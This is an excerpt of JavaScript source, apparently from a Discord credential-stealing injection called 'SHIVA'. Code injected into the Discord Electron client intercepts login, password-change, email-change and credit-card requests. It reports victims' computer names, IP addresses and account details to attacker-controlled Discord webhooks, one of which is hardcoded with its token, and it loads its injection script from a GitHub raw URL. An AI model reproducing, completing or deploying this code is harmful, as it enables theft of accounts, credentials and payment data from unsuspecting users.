...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/mehod/SHIVA/main/index.js",
    webhook: "%WEBHOOK%",
    uwu: "https://discord.com/api/webhooks/1097704870754127902/2ry681yhhoctPZWGzRXuHUH7W7e_solLwMoUVlnO4VwfQVTGAV0KkqxDXI8lN9lq60TH",
    Filter: {
        "urls": [
...
const makeEmbed = async ({
    ...
    var params = {
        ...
        avatar_url: "https://cdn.discordapp.com/attachments/1082093040132423741/1082787576886341753/static.png",
        content: "",
        embeds: [{
            title: title,
            ...
            footer: {
                text: "SHİVA V1.0 | https://discord.gg/shv"
            },
...
const FirstTime = async () => {
    ...
    if (!token) {
        ...
        if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/attachments/1082093040132423741/1082787576886341753/static.png"
        if (!user.banner) var userBanner = "https://cdn.discordapp.com/attachments/1082093040132423741/1082787576886341753/static.png"
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[SHİVA V1.0 <a:blackcapgif:1041634542093619260>](https://discord.gg/shv)`,
                inline: !0
            }, {
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "SHİVA User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "SHİVA Victim got logged out",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    inline: !1
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    ...
    switch (true) {
        case request.url.endsWith("login"):
            ...
            var params = await makeEmbed({
                title: "Shiva User Login",
                description: "[<a:blackcapgif:1041634542093619260>  **Oh you have SHİVA someone**](https://discord.gg/shv)",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "SHİVA Detect Password Changed",
                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have SHİVA someone**](https://discord.gg/shv)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "SHİVA Detect Email Changed",
                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have SHİVA someone**](https://discord.gg/shv)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "SHİVA User Credit Card Added",
                description: `
                **IP:** ${ip}\n\n
